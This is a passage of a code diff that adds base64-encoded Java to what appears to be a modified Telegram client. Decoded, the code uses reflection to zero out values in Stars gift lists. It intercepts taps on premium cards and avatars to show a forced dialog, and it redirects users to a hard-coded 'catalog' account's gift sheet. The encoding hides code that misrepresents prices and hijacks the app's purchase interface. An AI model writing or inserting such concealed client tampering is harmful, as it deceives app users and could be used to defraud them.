+    "ZXRDbGFzcygpOwogICAgICAgIGZvciAoU3RyaW5nIG5hbWUgOiBuYW1lcykgewogICAgICAgICAgICB0cnkgewogICAgICAgICAg"
+    "ICAgICAgRmllbGQgZjsKICAgICAgICAgICAgICAgIHRyeSB7IGYgPSBjbHMuZ2V0RmllbGQobmFtZSk7IH0gY2F0Y2ggKE5vU3Vj"
+    "aEZpZWxkRXhjZXB0aW9uIGUpIHsgZiA9IGNscy5nZXREZWNsYXJlZEZpZWxkKG5hbWUpOyB9CiAgICAgICAgICAgICAgICBmLnNl"
+    "dEFjY2Vzc2libGUodHJ1ZSk7CiAgICAgICAgICAgICAgICBDbGFzczw/PiB0ID0gZi5nZXRUeXBlKCk7CiAgICAgICAgICAgICAg"
+    "ICBpZiAodCA9PSBsb25nLmNsYXNzIHx8IHQgPT0gTG9uZy5jbGFzcykgZi5zZXRMb25nKG9iaiwgMEwpOwogICAgICAgICAgICAg"
+    "ICAgZWxzZSBpZiAodCA9PSBpbnQuY2xhc3MgfHwgdCA9PSBJbnRlZ2VyLmNsYXNzKSBmLnNldEludChvYmosIDApOwogICAgICAg"
+    "ICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAgICB9CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIHZvaWQg"
+    "cGF0Y2hTdGFyc0NvbnRyb2xsZXJDYWNoZShpbnQgYWNjb3VudCkgewogICAgICAgIHRyeSB7CiAgICAgICAgICAgIFN0YXJzQ29u"
+    "dHJvbGxlciBzYyA9IFN0YXJzQ29udHJvbGxlci5nZXRJbnN0YW5jZShhY2NvdW50KTsKICAgICAgICAgICAgaWYgKHNjID09IG51"
+    "bGwpIHJldHVybjsKICAgICAgICAgICAgZm9yIChTdHJpbmcgbGlzdE5hbWUgOiBuZXcgU3RyaW5nW117InN0YXJHaWZ0cyIsICJn"
+    "aWZ0cyIsICJhdmFpbGFibGVHaWZ0cyJ9KSB7CiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIEZpZWxk"
+    "IGYgPSBzYy5nZXRDbGFzcygpLmdldERlY2xhcmVkRmllbGQobGlzdE5hbWUpOwogICAgICAgICAgICAgICAgICAgIGYuc2V0QWNj"
+    "ZXNzaWJsZSh0cnVlKTsKICAgICAgICAgICAgICAgICAgICB6ZXJvT3V0TGlzdChmLmdldChzYykpOwogICAgICAgICAgICAgICAg"
+    "fSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdu"
+    "b3JlZCkge30KICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBhcHBseVplcm9QYXRjaGVzKGludCBhY2NvdW50LCBPYmplY3Qg"
+    "c2hlZXQpIHsKICAgICAgICBwYXRjaFN0YXJzQ29udHJvbGxlckNhY2hlKGFjY291bnQpOwogICAgICAgIGlmIChzaGVldCAhPSBu"
+    "dWxsKSB7CiAgICAgICAgICAgIGZvciAoU3RyaW5nIGZpZWxkTmFtZSA6IG5ldyBTdHJpbmdbXXsiZ2lmdHMiLCAic3RhckdpZnRz"
+    "IiwgIml0ZW1zIiwgIm9wdGlvbnMiLCAiYXZhaWxhYmxlR2lmdHMifSkgewogICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAg"
+    "ICAgICAgICAgICBGaWVsZCBmID0gc2hlZXQuZ2V0Q2xhc3MoKS5nZXREZWNsYXJlZEZpZWxkKGZpZWxkTmFtZSk7CiAgICAgICAg"
+    "ICAgICAgICAgICAgZi5zZXRBY2Nlc3NpYmxlKHRydWUpOwogICAgICAgICAgICAgICAgICAgIHplcm9PdXRMaXN0KGYuZ2V0KHNo"
+    "ZWV0KSk7CiAgICAgICAgICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAgICAgICAgfQogICAgICAg"
+    "IH0KICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBob29rUHJlbWl1bUNhcmRzKGZpbmFsIFZpZXcgcm9vdCwgZmluYWwgQ29u"
+    "dGV4dCBjb250ZXh0KSB7CiAgICAgICAgaWYgKHJvb3QgPT0gbnVsbCB8fCBjb250ZXh0ID09IG51bGwpIHJldHVybjsKICAgICAg"
+    "ICB0cnkgeyBzY2FuQW5kSG9va1ByZW1pdW0ocm9vdCwgY29udGV4dCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQog"
+    "ICAgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIGhvb2tBdmF0YXJzKGZpbmFsIFZpZXcgcm9vdCwgZmluYWwgQ29udGV4dCBjb250"
+    "ZXh0KSB7CiAgICAgICAgaWYgKHJvb3QgPT0gbnVsbCB8fCBjb250ZXh0ID09IG51bGwpIHJldHVybjsKICAgICAgICB0cnkgeyB3"
+    "YWxrQXZhdGFycyhyb290LCBjb250ZXh0KTsgfSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZWQpIHt9CiAgICB9CiAgICBwcml2YXRl"
+    "IHN0YXRpYyB2b2lkIHdhbGtBdmF0YXJzKFZpZXcgdmlldywgZmluYWwgQ29udGV4dCBjb250ZXh0KSB7CiAgICAgICAgaWYgKHZp"
+    "ZXcgPT0gbnVsbCkgcmV0dXJuOwogICAgICAgIHRyeSB7CiAgICAgICAgICAgIGlmICh2aWV3LmdldENsYXNzKCkuZ2V0TmFtZSgp"
+    "LmNvbnRhaW5zKCJCYWNrdXBJbWFnZVZpZXciKSAmJiAhaXNHaWZ0Q2VsbCh2aWV3KSkgewogICAgICAgICAgICAgICAgdmlldy5z"
+    "ZXRPbkNsaWNrTGlzdGVuZXIodiAtPiBzaG93U2ltcGxlTWVzc2FnZShjb250ZXh0LCBNU0dfQ0FUQUxPRykpOwogICAgICAgICAg"
+    "ICB9CiAgICAgICAgICAgIGlmICh2aWV3IGluc3RhbmNlb2YgVmlld0dyb3VwKSB7CiAgICAgICAgICAgICAgICBWaWV3R3JvdXAg"
+    "dmcgPSAoVmlld0dyb3VwKSB2aWV3OwogICAgICAgICAgICAgICAgZm9yIChpbnQgaSA9IDA7IGkgPCB2Zy5nZXRDaGlsZENvdW50"
+KCk7IGkrKykgd2Fsa0F2YXRhcnModmcuZ2V0Q2hpbGRBdChpKSwgY29udGV4dCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNh"
+    "dGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgIH0KICAgIHByaXZhdGUgc3RhdGljIGJvb2xlYW4gaXNHaWZ0Q2VsbChWaWV3"
+    "IHZpZXcpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBPYmplY3QgcCA9IHZpZXcuZ2V0UGFyZW50KCk7CiAgICAgICAgICAg"
+    "IGZvciAoaW50IGkgPSAwOyBpIDwgNiAmJiBwICE9IG51bGw7IGkrKykgewogICAgICAgICAgICAgICAgU3RyaW5nIG5hbWUgPSBw"
+    "LmdldENsYXNzKCkuZ2V0U2ltcGxlTmFtZSgpOwogICAgICAgICAgICAgICAgaWYgKG5hbWUuY29udGFpbnMoIkdpZnRDZWxsIikg"
+    "fHwgbmFtZS5jb250YWlucygiU3RhckdpZnQiKSkgcmV0dXJuIHRydWU7CiAgICAgICAgICAgICAgICBwID0gKHAgaW5zdGFuY2Vv"
+    "ZiBWaWV3KSA/ICgoVmlldykgcCkuZ2V0UGFyZW50KCkgOiBudWxsOwogICAgICAgICAgICB9CiAgICAgICAgfSBjYXRjaCAoVGhy"
+    "b3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgcmV0dXJuIGZhbHNlOwogICAgfQogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBzY2Fu"
+    "QW5kSG9va1ByZW1pdW0oVmlldyB2aWV3LCBmaW5hbCBDb250ZXh0IGNvbnRleHQpIHsKICAgICAgICBpZiAodmlldyA9PSBudWxs"
+    "KSByZXR1cm47CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKHZpZXcgaW5zdGFuY2VvZiBUZXh0VmlldykgewogICAgICAg"
+    "ICAgICAgICAgQ2hhclNlcXVlbmNlIGNzID0gKChUZXh0VmlldykgdmlldykuZ2V0VGV4dCgpOwogICAgICAgICAgICAgICAgaWYg"
+    "KGNzICE9IG51bGwpIHsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgdCA9IGNzLnRvU3RyaW5nKCkudG9Mb3dlckNhc2UoKTsK"
+    "ICAgICAgICAgICAgICAgICAgICBmb3IgKFN0cmluZyB3IDogUFJFTUlVTV9XT1JEUykgewogICAgICAgICAgICAgICAgICAgICAg"
+    "ICBpZiAodC5jb250YWlucyh3KSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVmlldyBjYXJkID0gZmluZFByZW1pdW1D"
+    "YXJkKHZpZXcpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNhcmQgIT0gbnVsbCkgYXR0YWNoUHJlbWl1bUJsb2Nr"
+    "ZXIoY2FyZCwgY29udGV4dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAg"
+    "ICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAo"
+    "dmlldyBpbnN0YW5jZW9mIFZpZXdHcm91cCkgewogICAgICAgICAgICAgICAgVmlld0dyb3VwIHZnID0gKFZpZXdHcm91cCkgdmll"
+    "dzsKICAgICAgICAgICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgdmcuZ2V0Q2hpbGRDb3VudCgpOyBpKyspIHNjYW5BbmRIb29r"
+    "UHJlbWl1bSh2Zy5nZXRDaGlsZEF0KGkpLCBjb250ZXh0KTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKFRocm93YWJs"
+    "ZSBpZ25vcmVkKSB7fQogICAgfQogICAgcHJpdmF0ZSBzdGF0aWMgaW50IGNvdW50UHJlbWl1bVRleHRzKFZpZXcgdmlldykgewog"
+    "ICAgICAgIGludCBjb3VudCA9IDA7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgaWYgKHZpZXcgaW5zdGFuY2VvZiBUZXh0Vmll"
+    "dykgewogICAgICAgICAgICAgICAgQ2hhclNlcXVlbmNlIGNzID0gKChUZXh0VmlldykgdmlldykuZ2V0VGV4dCgpOwogICAgICAg"
+    "ICAgICAgICAgaWYgKGNzICE9IG51bGwpIHsKICAgICAgICAgICAgICAgICAgICBTdHJpbmcgdCA9IGNzLnRvU3RyaW5nKCkudG9M"
+    "b3dlckNhc2UoKTsKICAgICAgICAgICAgICAgICAgICBmb3IgKFN0cmluZyB3IDogUFJFTUlVTV9XT1JEUykgeyBpZiAodC5jb250"
+    "YWlucyh3KSkgeyBjb3VudCsrOyBicmVhazsgfSB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAg"
+    "aWYgKHZpZXcgaW5zdGFuY2VvZiBWaWV3R3JvdXApIHsKICAgICAgICAgICAgICAgIFZpZXdHcm91cCB2ZyA9IChWaWV3R3JvdXAp"
+    "IHZpZXc7CiAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHZnLmdldENoaWxkQ291bnQoKTsgaSsrKSBjb3VudCAr"
+    "PSBjb3VudFByZW1pdW1UZXh0cyh2Zy5nZXRDaGlsZEF0KGkpKTsKICAgICAgICAgICAgfQogICAgICAgIH0gY2F0Y2ggKFRocm93"
+    "YWJsZSBpZ25vcmVkKSB7fQogICAgICAgIHJldHVybiBjb3VudDsKICAgIH0KICAgIHByaXZhdGUgc3RhdGljIFZpZXcgZmluZFBy"
+    "ZW1pdW1DYXJkKFZpZXcgdGV4dFZpZXcpIHsKICAgICAgICB0cnkgewogICAgICAgICAgICBWaWV3IGN1cnJlbnQgPSAoVmlldykg"
+    "dGV4dFZpZXcuZ2V0UGFyZW50KCk7CiAgICAgICAgICAgIFZpZXcgY2FuZGlkYXRlID0gbnVsbDsKICAgICAgICAgICAgZm9yIChp"
+    "bnQgaSA9IDA7IGkgPCA4ICYmIGN1cnJlbnQgIT0gbnVsbDsgaSsrKSB7CiAgICAgICAgICAgICAgICBpZiAoY3VycmVudCBpbnN0"
+    "YW5jZW9mIFZpZXdHcm91cCkgewogICAgICAgICAgICAgICAgICAgIGludCBhbW91bnQgPSBjb3VudFByZW1pdW1UZXh0cyhjdXJy"
+    "ZW50KTsKICAgICAgICAgICAgICAgICAgICBpZiAoYW1vdW50ID09IDEpIGNhbmRpZGF0ZSA9IGN1cnJlbnQ7CiAgICAgICAgICAg"
+    "ICAgICAgICAgZWxzZSBpZiAoY2FuZGlkYXRlICE9IG51bGwpIGJyZWFrOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAg"
+    "ICAgT2JqZWN0IHAgPSBjdXJyZW50LmdldFBhcmVudCgpOwogICAgICAgICAgICAgICAgY3VycmVudCA9IChwIGluc3RhbmNlb2Yg"
+    "VmlldykgPyAoVmlldykgcCA6IG51bGw7CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIGNhbmRpZGF0ZTsKICAgICAg"
+    "ICB9IGNhdGNoIChUaHJvd2FibGUgdCkgeyByZXR1cm4gbnVsbDsgfQogICAgfQogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBhdHRh"
+    "Y2hQcmVtaXVtQmxvY2tlcihWaWV3IGNhcmQsIGZpbmFsIENvbnRleHQgY29udGV4dCkgewogICAgICAgIGlmIChjYXJkID09IG51"
+    "bGwpIHJldHVybjsKICAgICAgICB0cnkgewogICAgICAgICAgICBjYXJkLnNldE9uVG91Y2hMaXN0ZW5lcigodiwgZXZlbnQpIC0+"
+    "IHsKICAgICAgICAgICAgICAgIGlmIChldmVudC5nZXRBY3Rpb24oKSA9PSBNb3Rpb25FdmVudC5BQ1RJT05fVVApIHsKICAgICAg"
+    "ICAgICAgICAgICAgICBtYWluSGFuZGxlci5wb3N0RGVsYXllZCgoKSAtPiBzaG93UHJlbWl1bU1lc3NhZ2UoY29udGV4dCksIDUw"
+    "KTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlOwogICAgICAgICAgICB9KTsKICAgICAgICAg"
+    "ICAgY2FyZC5zZXRDbGlja2FibGUodHJ1ZSk7CiAgICAgICAgICAgIGlmIChjYXJkIGluc3RhbmNlb2YgVmlld0dyb3VwKSB7CiAg"
+    "ICAgICAgICAgICAgICBWaWV3R3JvdXAgdmcgPSAoVmlld0dyb3VwKSBjYXJkOwogICAgICAgICAgICAgICAgZm9yIChpbnQgaSA9"
+    "IDA7IGkgPCB2Zy5nZXRDaGlsZENvdW50KCk7IGkrKykgYXR0YWNoUHJlbWl1bUJsb2NrZXIodmcuZ2V0Q2hpbGRBdChpKSwgY29u"
+    "dGV4dCk7CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgIH0KICAgIHByaXZh"
+    "dGUgc3RhdGljIHZvaWQgc2hvd1ByZW1pdW1NZXNzYWdlKENvbnRleHQgY29udGV4dCkgewogICAgICAgIGlmIChjb250ZXh0ID09"
+    "IG51bGwpIHJldHVybjsKICAgICAgICBpZiAocHJlbWl1bURpYWxvZ0xvY2suZ2V0KCkpIHJldHVybjsKICAgICAgICB0cnkgeyBp"
+    "ZiAocHJlbWl1bURpYWxvZyAhPSBudWxsICYmIHByZW1pdW1EaWFsb2cuaXNTaG93aW5nKCkpIHJldHVybjsgfSBjYXRjaCAoVGhy"
+    "b3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgcHJlbWl1bURpYWxvZ0xvY2suc2V0KHRydWUpOwogICAgICAgIHRyeSB7CiAgICAg"
+    "ICAgICAgIEFsZXJ0RGlhbG9nLkJ1aWxkZXIgYiA9IG5ldyBBbGVydERpYWxvZy5CdWlsZGVyKGNvbnRleHQpOwogICAgICAgICAg"
+    "ICBiLnNldE1lc3NhZ2UoTVNHX0NBVEFMT0cpOwogICAgICAgICAgICBiLnNldENhbmNlbGFibGUoZmFsc2UpOwogICAgICAgICAg"
+    "ICBiLnNldFBvc2l0aXZlQnV0dG9uKCLQpdC+0YDQvtGI0L4iLCAoZCwgdykgLT4gewogICAgICAgICAgICAgICAgdHJ5IHsgZC5k"
+    "aXNtaXNzKCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgICAgICAgICAgcHJlbWl1bURpYWxvZ0xvY2su"
+    "c2V0KGZhbHNlKTsKICAgICAgICAgICAgICAgIHByZW1pdW1EaWFsb2cgPSBudWxsOwogICAgICAgICAgICB9KTsKICAgICAgICAg"
+    "ICAgcHJlbWl1bURpYWxvZyA9IGIuY3JlYXRlKCk7CiAgICAgICAgICAgIHByZW1pdW1EaWFsb2cuc2V0Q2FuY2VsZWRPblRvdWNo"
+    "T3V0c2lkZShmYWxzZSk7CiAgICAgICAgICAgIHByZW1pdW1EaWFsb2cuc2V0Q2FuY2VsYWJsZShmYWxzZSk7CiAgICAgICAgICAg"
+    "IHByZW1pdW1EaWFsb2cuc2hvdygpOwogICAgICAgIH0gY2F0Y2ggKFRocm93YWJsZSB0KSB7IHByZW1pdW1EaWFsb2dMb2NrLnNl"
+    "dChmYWxzZSk7IHByZW1pdW1EaWFsb2cgPSBudWxsOyB9CiAgICB9CiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIHNob3dTaW1wbGVN"
+    "ZXNzYWdlKENvbnRleHQgY29udGV4dCwgU3RyaW5nIG1zZykgewogICAgICAgIGlmIChjb250ZXh0ID09IG51bGwpIHJldHVybjsK"
+    "ICAgICAgICBtYWluSGFuZGxlci5wb3N0KCgpIC0+IHsKICAgICAgICAgICAgdHJ5IHsgbmV3IEFsZXJ0RGlhbG9nLkJ1aWxkZXIo"
+    "Y29udGV4dCkuc2V0TWVzc2FnZShtc2cpLnNldFBvc2l0aXZlQnV0dG9uKCLQpdC+0YDQvtGI0L4iLCBudWxsKS5zaG93KCk7IH0g"
+    "Y2F0Y2ggKFRocm93YWJsZSBpZ25vcmVkKSB7fQogICAgICAgIH0pOwogICAgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIHN0YXJ0"
+    "U2hlZXRIZWxwZXJzKGZpbmFsIGludCBhY2NvdW50LCBmaW5hbCBPYmplY3Qgc2hlZXQsIGZpbmFsIFZpZXcgcm9vdCwgZmluYWwg"
+    "Q29udGV4dCBjb250ZXh0KSB7CiAgICAgICAgc2V0Q3VycmVudFNoZWV0KHNoZWV0KTsKICAgICAgICBwYXRjaFN0YXJzQ29udHJv"
+    "bGxlckNhY2hlKGFjY291bnQpOwogICAgICAgIGFwcGx5WmVyb1BhdGNoZXMoYWNjb3VudCwgc2hlZXQpOwogICAgICAgIGlmIChy"
+    "b290ICE9IG51bGwgJiYgY29udGV4dCAhPSBudWxsKSB7CiAgICAgICAgICAgIG1haW5IYW5kbGVyLnBvc3REZWxheWVkKCgpIC0+"
+    "IHsgaG9va0F2YXRhcnMocm9vdCwgY29udGV4dCk7IGhvb2tQcmVtaXVtQ2FyZHMocm9vdCwgY29udGV4dCk7IH0sIDgwMCk7CiAg"
+    "ICAgICAgfQogICAgICAgIGZvciAoaW50IGkgPSAwOyBpIDwgMzA7IGkrKykgewogICAgICAgICAgICBmaW5hbCBpbnQgZGVsYXkg"
+    "PSAxMDAgKyBpICogMTUwOwogICAgICAgICAgICBtYWluSGFuZGxlci5wb3N0RGVsYXllZCgoKSAtPiB7CiAgICAgICAgICAgICAg"
+    "ICBhcHBseVplcm9QYXRjaGVzKGFjY291bnQsIHNoZWV0KTsKICAgICAgICAgICAgICAgIGlmIChyb290ICE9IG51bGwgJiYgY29u"
+    "dGV4dCAhPSBudWxsKSBob29rUHJlbWl1bUNhcmRzKHJvb3QsIGNvbnRleHQpOwogICAgICAgICAgICB9LCBkZWxheSk7CiAgICAg"
+    "ICAgfQogICAgfQogICAgcHVibGljIHN0YXRpYyB2b2lkIG9uQ2F0YWxvZ1Njcm9sbElkbGUoVmlldyByb290LCBDb250ZXh0IGNv"
+    "bnRleHQpIHsKICAgICAgICBpZiAocm9vdCA9PSBudWxsIHx8IGNvbnRleHQgPT0gbnVsbCkgcmV0dXJuOwogICAgICAgIG1haW5I"
+    "YW5kbGVyLnBvc3QoKCkgLT4geyBob29rUHJlbWl1bUNhcmRzKHJvb3QsIGNvbnRleHQpOyBob29rQXZhdGFycyhyb290LCBjb250"
+    "ZXh0KTsgfSk7CiAgICB9CiAgICBwdWJsaWMgc3RhdGljIGxvbmcgcmVzb2x2ZVVzZXJuYW1lVG9Vc2VySWQoaW50IGFjY291bnQs"
+    "IFN0cmluZyB1c2VybmFtZSkgewogICAgICAgIGlmICh1c2VybmFtZSA9PSBudWxsIHx8IHVzZXJuYW1lLmxlbmd0aCgpID09IDAp"
+    "IHJldHVybiAwOwogICAgICAgIFN0cmluZyB1ID0gdXNlcm5hbWUuc3RhcnRzV2l0aCgiQCIpID8gdXNlcm5hbWUuc3Vic3RyaW5n"
+    "KDEpIDogdXNlcm5hbWU7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQ2xhc3M8Pz4gbWNDbHMgPSBDbGFzcy5mb3JOYW1lKCJv"
+    "cmcudGVsZWdyYW0ubWVzc2VuZ2VyLk1lc3NhZ2VzQ29udHJvbGxlciIpOwogICAgICAgICAgICBPYmplY3QgbWMgPSBtY0Nscy5n"
+    "ZXRNZXRob2QoImdldEluc3RhbmNlIiwgaW50LmNsYXNzKS5pbnZva2UobnVsbCwgYWNjb3VudCk7CiAgICAgICAgICAgIGZvciAo"
+    "U3RyaW5nIG1ldGhvZE5hbWUgOiBuZXcgU3RyaW5nW117ImdldFVzZXIiLCAiZ2V0VXNlck9yQ2hhdCJ9KSB7CiAgICAgICAgICAg"
+    "ICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIE1ldGhvZCBtID0gbWMuZ2V0Q2xhc3MoKS5nZXRNZXRob2QobWV0aG9kTmFt"
+    "ZSwgU3RyaW5nLmNsYXNzKTsKICAgICAgICAgICAgICAgICAgICBPYmplY3QgdXNlciA9IG0uaW52b2tlKG1jLCB1KTsKICAgICAg"
+    "ICAgICAgICAgICAgICBpZiAodXNlciAhPSBudWxsKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAg"
+    "ICAgICAgICAgICAgICAgICBGaWVsZCBpZGYgPSB1c2VyLmdldENsYXNzKCkuZ2V0RmllbGQoImlkIik7CiAgICAgICAgICAgICAg"
+    "ICAgICAgICAgICAgICBsb25nIGlkID0gKChOdW1iZXIpIGlkZi5nZXQodXNlcikpLmxvbmdWYWx1ZSgpOwogICAgICAgICAgICAg"
+    "ICAgICAgICAgICAgICAgaWYgKGlkICE9IDApIHJldHVybiBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoVGhy"
+    "b3dhYmxlIGlnbm9yZWQpIHt9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfSBjYXRjaCAoVGhyb3dhYmxl"
+    "IGlnbm9yZWQpIHt9CiAgICAgICAgICAgIH0KICAgICAgICB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAgICBy"
+    "ZXR1cm4gMDsKICAgIH0KICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBvcGVuQ2F0YWxvZ0Zyb21NYWluKGZpbmFsIEFjdGl2aXR5IGFj"
+    "dGl2aXR5LCBmaW5hbCBpbnQgYWNjb3VudCkgewogICAgICAgIGlmIChhY3Rpdml0eSA9PSBudWxsKSByZXR1cm47CiAgICAgICAg"
+    "bWFpbkhhbmRsZXIucG9zdCgoKSAtPiB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBsb25nIHRhcmdldElkID0g"
+    "cmVzb2x2ZVVzZXJuYW1lVG9Vc2VySWQoYWNjb3VudCwgQ0FUQUxPR19VU0VSTkFNRSk7CiAgICAgICAgICAgICAgICBpZiAodGFy"
+    "Z2V0SWQgPT0gMCkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7IFRvYXN0Lm1ha2VUZXh0KGFjdGl2aXR5LCAi0JrQsNGC0LDQ"
+    "u9C+0LM6INC90LUg0L3QsNC50LTQtdC9IEAiICsgQ0FUQUxPR19VU0VSTkFNRSArICIsINC+0YLQutGA0L7QudGC0LUg0L/RgNC+"
+    "0YTQuNC70YwiLCBUb2FzdC5MRU5HVEhfTE9ORykuc2hvdygpOyB9IGNhdGNoIChUaHJvd2FibGUgaWdub3JlZCkge30KICAgICAg"
+    "ICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGxvbmcgdXNlcklkID0gdGFyZ2V0SWQgIT0gMCA/IHRhcmdldElkIDogVXNlckNv"
+    "bmZpZy5nZXRJbnN0YW5jZShhY2NvdW50KS5nZXRDbGllbnRVc2VySWQoKTsKICAgICAgICAgICAgICAgIENsYXNzPD8+IHNoZWV0"
+    "Q2xzID0gQ2xhc3MuZm9yTmFtZSgib3JnLnRlbGVncmFtLnVpLkdpZnRzLkdpZnRTaGVldCIpOwogICAgICAgICAgICAgICAgT2Jq"
+    "ZWN0IHNoZWV0ID0gbnVsbDsKICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgc2hlZXQgPSBzaGVldENs"
+    "cy5nZXRDb25zdHJ1Y3RvcihDb250ZXh0LmNsYXNzLCBpbnQuY2xhc3MsIGxvbmcuY2xhc3MsIExpc3QuY2xhc3MsIE9iamVjdC5j"
+    "bGFzcykubmV3SW5zdGFuY2UoYWN0aXZpdHksIGFjY291bnQsIHVzZXJJZCwgbnVsbCwgbnVsbCk7CiAgICAgICAgICAgICAgICB9"
+    "IGNhdGNoIChUaHJvd2FibGUgaWdub3JlKSB7fQogICAgICAgICAgICAgICAgaWYgKHNoZWV0ID09IG51bGwpIHsKICAgICAgICAg"
+    "ICAgICAgICAgICB0cnkgeyBzaGVldCA9IHNoZWV0Q2xzLmdldENvbnN0cnVjdG9yKENvbnRleHQuY2xhc3MsIGludC5jbGFzcywg"
+    "bG9uZy5jbGFzcykubmV3SW5zdGFuY2UoYWN0aXZpdHksIGFjY291bnQsIHVzZXJJZCk7IH0gY2F0Y2ggKFRocm93YWJsZSBpZ25v"
+    "cmUpIHt9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoc2hlZXQgPT0gbnVsbCkgewogICAgICAgICAgICAg"
+    "ICAgICAgIGZvciAoQ29uc3RydWN0b3I8Pz4gY29ucyA6IHNoZWV0Q2xzLmdldENvbnN0cnVjdG9ycygpKSB7CiAgICAgICAgICAg"
+    "ICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBDbGFzczw/PltdIHAgPSBjb25zLmdldFBhcmFt"
+    "ZXRlclR5cGVzKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBPYmplY3RbXSBhcmdzID0gbmV3IE9iamVjdFtwLmxlbmd0"
+    "aF07CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKGludCBpID0gMDsgaSA8IHAubGVuZ3RoOyBpKyspIHsKICAgICAg"
+    "ICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoQ29udGV4dC5jbGFzcy5pc0Fzc2lnbmFibGVGcm9tKHBbaV0pKSBhcmdzW2ld"
+    "ID0gYWN0aXZpdHk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSBpZiAocFtpXSA9PSBpbnQuY2xhc3MgfHwg"
+    "cFtpXSA9PSBJbnRlZ2VyLmNsYXNzKSBhcmdzW2ldID0gYWNjb3VudDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBl"
+    "bHNlIGlmIChwW2ldID09IGxvbmcuY2xhc3MgfHwgcFtpXSA9PSBMb25nLmNsYXNzKSBhcmdzW2ldID0gdXNlcklkOwogICAgICAg"
+    "ICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgYXJnc1tpXSA9IG51bGw7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9"
+    "CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzaGVldCA9IGNvbnMubmV3SW5zdGFuY2UoYXJncyk7CiAgICAgICAgICAgICAg"
+    "ICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoVGhyb3dhYmxlIGlnbm9yZSkge30K"
+    "ICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoc2hlZXQgIT0gbnVsbCkg"
+    "ewogICAgICAgICAgICAgICAgICAgIHRyeSB7IHNoZWV0Q2xzLmdldE1ldGhvZCgic2hvdyIpLmludm9rZShzaGVldCk7IH0gY2F0"
+    "Y2ggKFRocm93YWJsZSBpZ25vcmUpIHt9CiAgICAgICAgICAgICAgICAgICAgVmlldyBkZWNvciA9IG51bGw7CiAgICAgICAgICAg"
+    "ICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgT2JqZWN0IHdpbiA9IHNoZWV0Q2xzLmdldE1ldGhvZCgiZ2V0"
+    "V2luZG93IikuaW52b2tlKHNoZWV0KTsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHdpbiAhPSBudWxsKSBkZWNvciA9IChW"
